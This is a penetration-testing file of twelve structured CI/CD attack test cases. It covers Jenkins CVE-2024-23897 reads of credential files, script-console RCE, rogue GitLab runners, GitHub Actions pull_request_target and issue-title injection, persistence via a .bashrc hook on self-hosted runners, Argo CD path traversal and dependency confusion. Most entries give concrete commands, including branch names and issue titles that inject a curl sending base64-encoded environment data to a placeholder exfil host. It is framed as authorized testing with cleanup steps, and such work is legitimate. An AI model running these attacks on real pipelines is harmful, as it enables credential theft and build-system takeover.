# CI/CD Supply Chain Attack Test Cases

> Companion to `SKILL.md`, containing structured test cases TC-CD-001 through TC-CD-012 covering Jenkins script console RCE, CVE-2024-23897 args4j exploit, Jenkinsfile injection, GitLab self-hosted runner takeover, GitHub Actions `pull_request_target` abuse, workflow injection via issue/PR title, self-hosted runner persistence, dependency-confusion PoC lab, malicious npm implant, Argo CD CVE-2022-24348 secret leak, build provenance/SLSA verification, and OpenSSF Scorecard + Harden-Runner audit.
>
> All commands assume lawful authorization, a signed scope-of-work, and explicit per-test client approval before any active exploitation against production CI/CD systems. Exploiting a CI/CD system you do not own is a crime in most jurisdictions (CFAA, CMA, equivalents).

---

## Statistics

| Category | Count | Severity Range |
|------|------|-----------|
| A. CI/CD Recon & Surface Mapping | 1 | MEDIUM |
| B. Jenkins Exploitation | 3 | HIGH - CRITICAL |
| C. GitLab CI/CD Exploitation | 1 | HIGH |
| D. GitHub Actions Exploitation | 3 | HIGH - CRITICAL |
| E. Argo CD / Flux CD | 1 | HIGH |
| F. Dependency & Supply Chain | 2 | HIGH - CRITICAL |
| G. Verification & Defense Audit | 1 | MEDIUM |
| **Total** | **12** | **MEDIUM - CRITICAL** |

---

## A. CI/CD Recon & Surface Mapping

### TC-CD-001: CI/CD Platform Recon & Secret-Scope Mapping

| Field | Value |
|------|-----|
| **ID** | TC-CD-001 |
| **Name** | CI/CD Platform Recon & Secret-Scope Mapping |
| **Prerequisites** | A target repo URL (public or authorized-private); OpenSSF Scorecard installed; the client engagement letter naming the target; for GitLab/Jenkins targets, a read-only PAT or anonymous read access; no active exploits in this test case. |
| **Objective** | From a target repo's surface, map every workflow file, identify `pull_request_target` traps, locate workflow-injection sinks (interpolation of `github.event.*` into `run:`), enumerate self-hosted runner usage, and score the repo's supply-chain posture with OpenSSF Scorecard. The deliverable is a CI/CD surface map used to prioritize TC-CD-002 through TC-CD-012. |
| **Tools** | git, gh (GitHub CLI), glab (GitLab CLI), grep, jq, OpenSSF Scorecard |
| **Steps** | 1. Clone the target: `git clone <repo_url> target && cd target`<br>2. Enumerate workflow files: `ls -la .github/workflows/ 2>/dev/null; ls -la .gitlab-ci.yml 2>/dev/null; ls -la Jenkinsfile 2>/dev/null`<br>3. Score the repo: `scorecard --repo=<repo_url> --format=json -o scorecard.json`<br>4. Find `pull_request_target`: `grep -rEl "pull_request_target" .github/workflows/ 2>/dev/null`<br>5. Find workflow-injection sinks: `grep -rEn '\$\{\{.*github\.event\.(issue\|pull_request\|comment\|head_ref\|ref)' .github/workflows/`<br>6. Find self-hosted runners: `grep -rEn "runs-on:.*self-hosted" .github/workflows/`<br>7. Find token permissions: `for f in .github/workflows/*.yml; do echo "=== $f ==="; awk '/^permissions:/{flag=1} flag{print} /^[a-z]/{if(flag && $0 !~ /^ /) flag=0}' "$f"; done`<br>8. Find secrets in PR-triggered workflows (smoking gun): `for f in $(grep -rEl "pull_request_target\|pull_request:" .github/workflows/); do echo "=== $f ==="; grep -nE "secrets\\.\|GITHUB_TOKEN\|env:" "$f"; done`<br>9. Assemble surface-map report: per workflow, list trigger types, secrets referenced, runner type, permissions, and whether any github.event.* interpolation is present |
| **Expected Result** | A CI/CD surface map listing every workflow, its trigger, runner type, secrets referenced, and any workflow-injection sink. Highest-risk items flagged (pull_request_target + secrets + checkout of head.sha). |
| **Cleanup** | `rm -rf target scorecard.json` |
| **References** | SKILL.md §Practical Steps Exercise 1; payloads.md §1 |

---

## B. Jenkins Exploitation

### TC-CD-002: CVE-2024-23897 — args4j Argument Expansion File Read

| Field | Value |
|------|-----|
| **ID** | TC-CD-002 |
| **Name** | CVE-2024-23897 args4j File Read on Jenkins CLI |
| **Prerequisites** | Jenkins master reachable at `<jenkins_url>`; Jenkins version < 2.442 or < LTS 2.426.3; `jenkins-cli.jar` downloadable from the target; explicit written authorization naming the Jenkins URL in scope. Exploiting this CVE against a non-owned Jenkins is a felony under CFAA and equivalents. |
| **Objective** | Demonstrate that the Jenkins CLI's args4j argument expansion (`@<file>`) can be used to read arbitrary files on the Jenkins master (including `secrets/master.key` and `credentials.xml`), enabling downstream credential decryption and script-console takeover. |
| **Tools** | jenkins-cli.jar, java, curl, jq |
| **Steps** | 1. Confirm version: `curl -sI <jenkins_url>/ \| grep -i "x-jenkins"`<br>2. Download the CLI jar: `curl -sO <jenkins_url>/jnlpJars/jenkins-cli.jar`<br>3. Read `/etc/passwd` (canonical PoC): `java -jar jenkins-cli.jar -s <jenkins_url> help "@/etc/passwd"`<br>4. Read Jenkins master key: `java -jar jenkins-cli.jar -s <jenkins_url> help "--@/var/lib/jenkins/secrets/master.key"`<br>5. Read credentials.xml: `java -jar jenkins-cli.jar -s <jenkins_url> help "@/var/lib/jenkins/credentials.xml"`<br>6. Verify the read by checking that the file contents appear in the help output<br>7. Save harvested artifacts to encrypted storage (do not commit to repo) |
| **Expected Result** | The contents of `/etc/passwd`, `secrets/master.key`, and `credentials.xml` are retrievable without authentication (or with any user role). The `master.key` and `credentials.xml` pair enable offline decryption of stored credentials via the script-console Groovy in TC-CD-003. |
| **Cleanup** | `shred -u master.key credentials.xml etc_passwd.txt jenkins-cli.jar`. Notify the client immediately — this CVE is being actively exploited in the wild. |
| **References** | SKILL.md §Practical Steps Exercise 2; payloads.md §2.1, §2.2 |

### TC-CD-003: Jenkins Script Console RCE

| Field | Value |
|------|-----|
| **ID** | TC-CD-003 |
| **Name** | Jenkins Script Console RCE (Admin or Stolen Token) |
| **Prerequisites** | Either (a) anonymous script-console access (`/script`) — common on misconfigured Jenkins, or (b) a stolen admin user API token, or (c) the master key + credentials.xml from TC-CD-002 enabling an offline decrypt to obtain an admin token. Explicit authorization for RCE on the Jenkins master. |
| **Objective** | Demonstrate that the Jenkins script console (`/script` or `/scriptText`) executes arbitrary Groovy on the master, leading to OS command execution and full system takeover. |
| **Tools** | curl, Jenkins CLI, Groovy (embedded) |
| **Steps** | 1. Build a CSRF crumb: `CRUMB=$(curl -s -c /tmp/jc.txt <jenkins_url>/crumbIssuer/api/json \| jq -r '.crumb')`<br>2. Read crumb header: `CRUMB_HEADER=$(curl -s <jenkins_url>/crumbIssuer/api/json \| jq -r '.crumbRequestField + ":" + .crumb')`<br>3. Verify RCE with `id`: `curl -b /tmp/jc.txt -H "$CRUMB_HEADER" --data-urlencode 'script=println "id".execute().text' <jenkins_url>/scriptText/`<br>4. List accessible secrets via Groovy (SystemCredentialsProvider): see payloads.md §2.2 for the Groovy script<br>5. Plant a rogue agent for persistence: see payloads.md §2.6<br>6. Document every command run with timestamps for the engagement report |
| **Expected Result** | `id` output confirms the build user (typically `jenkins`); credential enumeration returns every stored credential; rogue agent registration succeeds. |
| **Cleanup** | Remove the rogue agent node: `curl -b /tmp/jc.txt -H "$CRUMB_HEADER" --data-urlencode 'script=Jenkins.instance.removeNode(Jenkins.instance.getNode("rogue-agent"))' <jenkins_url>/scriptText/`. Coordinate with client on rotation of every credential stored in Jenkins. |
| **References** | SKILL.md §Practical Steps Exercise 2; payloads.md §2.2, §2.3, §2.6 |

### TC-CD-004: Jenkinsfile Injection via Branch Name

| Field | Value |
|------|-----|
| **ID** | TC-CD-004 |
| **Name** | Jenkinsfile Shell Injection via Branch Name |
| **Prerequisites** | A target Jenkins job that interpolates `env.BRANCH_NAME` (or another attacker-controllable field) into a `sh` step; push access to the target repo (or fork-PR access if the Jenkins job builds PRs); explicit authorization to push malicious branch names to the target repo. |
| **Objective** | Demonstrate that a Jenkinsfile `sh "echo ${env.BRANCH_NAME}"` step is shell injection when the attacker controls the branch name, leading to RCE on the build runner. |
| **Tools** | git, Jenkins |
| **Steps** | 1. Identify the vulnerable Jenkinsfile: `grep -nE 'sh.*\\$\\{env\\.BRANCH_NAME' Jenkinsfile`<br>2. Verify the branch name is attacker-controllable: confirm the job builds branches named by the developer<br>3. Create a malicious branch name: `git checkout -b "'; curl http://REPLACE_WITH_YOUR_EXFIL_HOST/\\$(env\\|base64 -w0); echo '"`<br>4. Push the branch: `git push origin HEAD`<br>5. Trigger the build: `java -jar jenkins-cli.jar -s <jenkins_url> build <job_name> -p BRANCH_NAME=HEAD`<br>6. Observe exfil at the attacker host<br>7. Document the timing — the build log shows the curl executed |
| **Expected Result** | The curl request fires from the build runner with the build user's environment. The runner's IAM credentials (if any) are exfiltrated. |
| **Cleanup** | `git push origin --delete "'; curl http://REPLACE_WITH_YOUR_EXFIL_HOST/$(env|base64 -w0); echo '"` (delete the malicious branch). Purge the build from Jenkins history. |
| **References** | SKILL.md §Practical Steps; payloads.md §2.4 |

---

## C. GitLab CI/CD Exploitation

### TC-CD-005: GitLab Self-Hosted Runner Takeover via Leaked Registration Token

| Field | Value |
|------|-----|
| **ID** | TC-CD-005 |
| **Name** | GitLab Self-Hosted Runner Takeover via Leaked Registration Token |
| **Prerequisites** | A GitLab runner registration token (`glrt-...` or `GR1348941...`) discovered via leaked `.gitlab-ci.yml`, CI logs, or screenshots; the GitLab URL; `gitlab-runner` binary installed; a clean VM to host the rogue runner; explicit authorization to register runners against the target GitLab instance. |
| **Objective** | Demonstrate that a leaked GitLab runner registration token allows a rogue runner to be registered with attacker-chosen tags (e.g., `linux`, `prod`), capturing every subsequent job with those tags — including jobs that pass protected CI variables (deploy tokens, kubeconfigs, vault tokens) in env. |
| **Tools** | gitlab-runner, curl, jq |
| **Steps** | 1. Confirm the token is valid: `curl -s --header "PRIVATE-TOKEN: REPLACE_WITH_YOUR_TOKEN" "<gitlab_url>/api/v4/runners"` (note: this is the runner auth, not the registration API)<br>2. Register the rogue runner: `gitlab-runner register --url <gitlab_url> --registration-token REPLACE_WITH_YOUR_REGISTRATION_TOKEN --executor shell --description "ci-cd-rogue-runner" --tag-list "linux,prod,docker" --run-untagged --locked=false`<br>3. Verify: `gitlab-runner verify`<br>4. Configure the exfil hook in `/etc/gitlab-runner/config.toml` (`pre_build_script`): see payloads.md §3.3<br>5. Restart: `sudo gitlab-runner restart`<br>6. Wait for a tagged job — confirm env capture at the attacker host<br>7. Document the credentials harvested (PROD_DEPLOY_TOKEN, KUBECONFIG, VAULT_TOKEN) |
| **Expected Result** | The rogue runner picks up jobs tagged `linux`, `prod`, or `docker`. Each job's env (including masked CI variables, which are unmasked in the runner's shell) is exfiltrated to the attacker host. |
| **Cleanup** | Unregister the rogue runner: `gitlab-runner unregister --name ci-cd-rogue-runner`. Notify client immediately — this is a CRITICAL finding requiring token rotation across the entire runner fleet. |
| **References** | SKILL.md §Practical Steps Exercise 3; payloads.md §3.2, §3.3 |

---

## D. GitHub Actions Exploitation

### TC-CD-006: `pull_request_target` Secret Exfiltration

| Field | Value |
|------|-----|
| **ID** | TC-CD-006 |
| **Name** | pull_request_target Workflow Secret Exfiltration |
| **Prerequisites** | A target GitHub repo with a workflow that uses `pull_request_target`, checks out `${{ github.event.pull_request.head.sha }}`, and exposes secrets in env to subsequent steps; a GitHub account authorized to fork the target (for public repos, any account); explicit engagement authorization naming the target repo. |
| **Objective** | Demonstrate that a forked PR can exfiltrate repository secrets via a `pull_request_target` workflow that checks out the PR ref and runs attacker code with the secret env. |
| **Tools** | git, gh, npm (any package manager with `preinstall` works) |
| **Steps** | 1. Identify the vulnerable workflow: `grep -rEl "pull_request_target" .github/workflows/` then inspect each for `${{ github.event.pull_request.head.sha }}` and `secrets.*` in env<br>2. Fork the target repo<br>3. In the fork, modify `package.json` to add a `preinstall` script that exfiltrates `process.env`: see payloads.md §4.1 for the exact script<br>4. Open a PR against the target<br>5. Wait for the workflow run (or check `gh run list --workflow=<workflow_name>`)<br>6. Confirm exfil at the attacker host<br>7. Document: PR URL, run URL, timestamp, secret value (masked form for the report) |
| **Expected Result** | The forked PR triggers the `pull_request_target` workflow, which checks out attacker code and runs `npm ci` / `npm install` with `DEPLOY_TOKEN`, `NPM_TOKEN`, etc. in env. The `preinstall` script exfiltrates these to the attacker host. |
| **Cleanup** | Close the PR: `gh pr close <num> --delete-branch`. Rotate every secret the workflow exposed. Notify GitHub Abuse if the engagement involves a public repo (GitHub may have already detected this). |
| **References** | SKILL.md §Practical Steps Exercise 4; payloads.md §4.1 |

### TC-CD-007: Workflow Injection via Issue/PR Title

| Field | Value |
|------|-----|
| **ID** | TC-CD-007 |
| **Name** | Workflow Injection via Issue Title |
| **Prerequisites** | A target GitHub repo with a workflow triggered on `issues` or `issue_comment` that interpolates `${{ github.event.issue.title }}` (or `.body`, `.comment.body`) into a `run:` block; a GitHub account authorized to open issues on the target; explicit authorization for shell-injection testing against the target repo. |
| **Objective** | Demonstrate that `${{ github.event.* }}` interpolation into `run:` blocks is shell injection, leading to RCE on the runner with `secrets.GITHUB_TOKEN` access. |
| **Tools** | gh |
| **Steps** | 1. Identify the vulnerable workflow: `grep -rEn '\\$\\{\\{.*github\\.event\\.(issue\\|pull_request\\|comment)\\.title' .github/workflows/`<br>2. Confirm the interpolated value flows into a `run:` block (not just `with:` inputs)<br>3. Open an issue with a shell-injection title: `gh issue create --title "$(printf '"; curl http://REPLACE_WITH_YOUR_EXFIL_HOST/$(env\\|base64 -w0); echo \"')" --body "tracer"`<br>4. Wait for the workflow to fire (the `issues` trigger runs immediately on open)<br>5. Confirm exfil at the attacker host<br>6. Document: issue URL, run URL, timestamp |
| **Expected Result** | The issue title interpolates into the `run:` block as shell; the curl command fires from the runner with `secrets.GITHUB_TOKEN` in env. |
| **Cleanup** | Close and delete the issue: `gh issue close <num> && gh issue delete <num>`. Document the finding. |
| **References** | SKILL.md §Practical Steps Exercise 5; payloads.md §4.3 |

### TC-CD-008: Self-Hosted Runner Persistence

| Field | Value |
|------|-----|
| **ID** | TC-CD-008 |
| **Name** | Self-Hosted Runner Persistence Beyond Job Cleanup |
| **Prerequisites** | A GitHub Actions self-hosted runner where the engagement has achieved one job execution (e.g., via TC-CD-006 or TC-CD-007); the runner does not wipe `/home/runner` between jobs (typical self-hosted); explicit authorization for persistence testing. |
| **Objective** | Demonstrate that a self-hosted GitHub Actions runner can be made to persist a payload across job boundaries, capturing secrets from every subsequent job on the same runner. This is the closest analog to the Codecov and SolarWinds compromise patterns and is the highest-severity finding in this skill. |
| **Tools** | bash, cron/systemd/launchd, curl |
| **Steps** | 1. From inside a job step (job runs as `runner` user), drop the harvester: see payloads.md §11.2 for the script (`~/.local/ci-cd-supply-chain-attack/harvest.sh`)<br>2. Start it via `nohup ... & disown`<br>3. Hook `~/.bashrc` so any subsequent job that starts a shell re-launches the harvester: `echo "~/.local/ci-cd-supply-chain-attack/harvest.sh &" >> ~/.bashrc`<br>4. As an alternative persistence path, install a `systemd --user` service (Linux) or LaunchAgent (macOS) — see payloads.md §11.2<br>5. Trigger another job (the engagement team will need to push a benign PR or workflow_dispatch) and confirm the new job's env is exfiltrated<br>6. Document: persistence mechanism, jobs harvested, secrets captured |
| **Expected Result** | The harvester survives job cleanup (because it lives outside `/home/runner/work`). Each subsequent job's env is exfiltrated. |
| **Cleanup** | Stop the harvester: `pkill -f ci-cd-supply-chain-attack/harvest`. Remove the dropped files: `rm -rf ~/.local/ci-cd-supply-chain-attack`. Remove the cron/systemd/launchd entries. Notify client immediately — this runner is currently compromised and every secret it has touched must be rotated. |
| **References** | SKILL.md §Practical Steps Exercise 6; payloads.md §11 |

---

## E. Argo CD / Flux CD

### TC-CD-009: Argo CD CVE-2022-24348 Helm Values Leak

| Field | Value |
|------|-----|
| **ID** | TC-CD-009 |
| **Name** | Argo CD CVE-2022-24348 Cross-Project Helm Values Leak |
| **Prerequisites** | Argo CD deployment reachable at `<argo_url>`; version < 2.1.15 or < 2.0.18 (CVE-2022-24348 affected); a low-privilege app in a non-admin project; explicit authorization naming the Argo CD instance. |
| **Objective** | Demonstrate that a low-privilege Argo CD application can leak Helm values (containing secrets) from other projects' applications via crafted sync requests that traverse into another project's chart path. |
| **Tools** | argocd CLI, curl, jq |
| **Steps** | 1. Confirm version: `curl -sk <argo_url>/api/version \| jq .Version`<br>2. Authenticate as the low-priv user: `argocd login <argo_url> --username REPLACE_WITH_YOUR_USER --password REPLACE_WITH_YOUR_PASS --insecure`<br>3. Identify your app and its source path: `argocd app get REPLACE_WITH_YOUR_APP --output json \| jq .spec.source`<br>4. Request sync with a values path traversing into another project's chart: `argocd app sync REPLACE_WITH_YOUR_APP --values /../../REPLACE_WITH_YOUR_OTHER_APP/charts/values.yaml`<br>5. Observe the resulting sync output — Helm values from the other project are rendered<br>6. Document the leaked values |
| **Expected Result** | Helm values from a different Argo CD project (which may contain secrets) are returned in the sync output. |
| **Cleanup** | N/A (read-only exploitation). Coordinate with client on Argo CD upgrade and RBAC review. |
| **References** | SKILL.md §Practical Steps Exercise 9; payloads.md §6.1 |

---

## F. Dependency & Supply Chain

### TC-CD-010: Dependency Confusion PoC Lab

| Field | Value |
|------|-----|
| **ID** | TC-CD-010 |
| **Name** | Dependency Confusion PoC in Sandbox Lab |
| **Prerequisites** | A sandbox scope (`REPLACE_WITH_YOUR_SCOPE`) registered on the public npm registry for the engagement; Verdaccio running locally as a private registry; a target project with vulnerable `.npmrc` (private scope with public fallback); explicit authorization. This TC is for LAB demonstration only — dependency confusion against a third party without prior written authorization is the same felony as the 2021 Alex Birsan research (which was fully authorized in advance). |
| **Objective** | Demonstrate the dependency-confusion attack pattern: register a higher-version public package matching the target's private package name, observe that the next `npm install` resolves to the malicious public version, and the `preinstall` script runs on the build runner. |
| **Tools** | npm, Verdaccio (Docker), curl |
| **Steps** | 1. Start Verdaccio as the private registry: `docker run -d --name verdaccio -p 4873:4873 -v $(pwd)/verdaccio:/verdaccio/conf verdaccio/verdaccio`<br>2. Publish a legit private package: `npm init --scope=@REPLACE_WITH_YOUR_SCOPE -y && npm publish --registry http://localhost:4873`<br>3. Create the target project with vulnerable `.npmrc` and `package.json` referencing the private package (see payloads.md §8.2)<br>4. Build the malicious public package with `preinstall` exfil: see payloads.md §8.3 — version `99.99.99`<br>5. Publish the malicious package to public npm: `npm publish --access public --registry https://registry.npmjs.org`<br>6. Trigger the target's install: `cd target && npm install`<br>7. Observe: npm resolves the higher public version (`99.99.99` > `1.0.0`), runs `preinstall`, exfil fires<br>8. Document: the resolved version, the executed `preinstall` |
| **Expected Result** | npm installs `@REPLACE_WITH_YOUR_SCOPE/internal-utils@99.99.99` (the malicious public package) instead of `1.0.0` (the private package). The `preinstall` script runs and fires the exfil call. |
| **Cleanup** | Unpublish the malicious package from public npm: `npm unpublish @REPLACE_WITH_YOUR_SCOPE/internal-utils --force`. Stop Verdaccio: `docker rm -f verdaccio`. |
| **References** | SKILL.md §Practical Steps Exercise 7; payloads.md §8 |

### TC-CD-011: Malicious npm Implant Analysis (event-stream / ua-parser-js)

| Field | Value |
|------|-----|
| **ID** | TC-CD-011 |
| **Name** | Malicious npm Package Static Analysis |
| **Prerequisites** | Isolated VM with no network egress except a logged proxy; `npm pack` available; `semgrep`, `socket` CLI installed; the package tarball(s) of a known-malicious version (e.g., `flatmap-stream@0.1.1`, `ua-parser-js@0.7.29`, `event-stream@3.3.6`) downloaded from the registry; explicit authorization (these are public packages — analysis is permitted; just ensure no accidental execution of the payload). |
| **Objective** | Reverse a known-malicious npm package to extract the implant pattern: install hooks, exfil endpoints, target selection logic, and IOCs. The deliverable is a written analysis suitable as a learning resource for the engagement team's detection engineering. |
| **Tools** | npm, tar, jq, semgrep, Socket CLI, file, strings |
| **Steps** | 1. Pull the malicious version: `npm pack flatmap-stream@0.1.1`<br>2. Inspect install scripts: `tar -xzf flatmap-stream-0.1.1.tgz && jq '.scripts' package/package.json`<br>3. Run semgrep malicious-package rules: `semgrep --config p/malicious-packages package/`<br>4. Submit to Socket for IOC enrichment: `socket security scan package/`<br>5. Deobfuscate the payload (manual or with `webcrack`/`de4js`)<br>6. Extract IOCs: exfil host, target package name, target user/wallet pattern<br>7. Repeat for `ua-parser-js@0.7.29` and `event-stream@3.3.6` (where applicable)<br>8. Document: the implant pattern, IOCs, detection signatures |
| **Expected Result** | A written analysis of the malicious package covering: install hook mechanism, payload obfuscation, exfil endpoint, target selection (if any), and detection signatures for SIEM/SBOM scanners. |
| **Cleanup** | `rm -rf package flatmap-stream-0.1.1.tgz`. Purge the analysis VM (revert snapshot). |
| **References** | SKILL.md §Practical Steps Exercise 8; payloads.md §10 |

---

## G. Verification & Defense Audit

### TC-CD-012: OpenSSF Scorecard + Harden-Runner Baseline Audit

| Field | Value |
|------|-----|
| **ID** | TC-CD-012 |
| **Name** | OpenSSF Scorecard + StepSecurity Harden-Runner Baseline Audit |
| **Prerequisites** | Read access to the target repo; OpenSSF Scorecard installed; for Harden-Runner testing, a development fork where the engagement team can apply Harden-Runner to every workflow; explicit engagement scope for the audit. |
| **Objective** | Establish the target's baseline supply-chain posture via OpenSSF Scorecard (every check scored 0-10) and validate that StepSecurity Harden-Runner in `audit` mode can detect anomalous egress, process execution, and filesystem access on a workflow run. |
| **Tools** | OpenSSF Scorecard, StepSecurity Harden-Runner, GitHub Actions |
| **Steps** | 1. Run Scorecard: `scorecard --repo=<repo_url> --format=json -o scorecard.json`<br>2. Review each check; flag any score < 7 as remediation-required<br>3. In the development fork, add Harden-Runner as the first step of every workflow (see payloads.md §14.2)<br>4. Trigger each workflow once; observe the Harden-Runner audit output<br>5. Document the egress endpoints actually used per workflow (the baseline allowlist)<br>6. Switch Harden-Runner to `egress-policy: block` with the allowlist<br>7. Re-run each workflow and confirm no jobs break |
| **Expected Result** | OpenSSF Scorecard report with per-check scores; Harden-Runner audit log listing every egress endpoint per workflow; allowlist applied; `block` mode passes without false-positive job failures. |
| **Cleanup** | N/A (defense-audit TC; no exploitation). |
| **References** | SKILL.md §Practical Steps Exercise 10; payloads.md §14 |

---

## Severity Classification

| Severity | Description | TC Examples |
|----------|-------------|-------------|
| **CRITICAL** | Unauthorized RCE, mass credential theft, or production backdoor | TC-CD-003, TC-CD-005, TC-CD-006, TC-CD-008, TC-CD-010 |
| **HIGH** | Lateral movement potential, secret exposure, runner compromise | TC-CD-002, TC-CD-004, TC-CD-007, TC-CD-009, TC-CD-011 |
| **MEDIUM** | Recon, surface mapping, defensive audit | TC-CD-001, TC-CD-012 |

---

## Cross-References

- **SKILL.md** §Practical Steps: full payload context for each TC
- **payloads.md**: 80+ code blocks across 15 sections, organized by CI/CD platform
- **guides/ci-cd-supply-chain-attack-playbook.md**: end-to-end engagement workflow
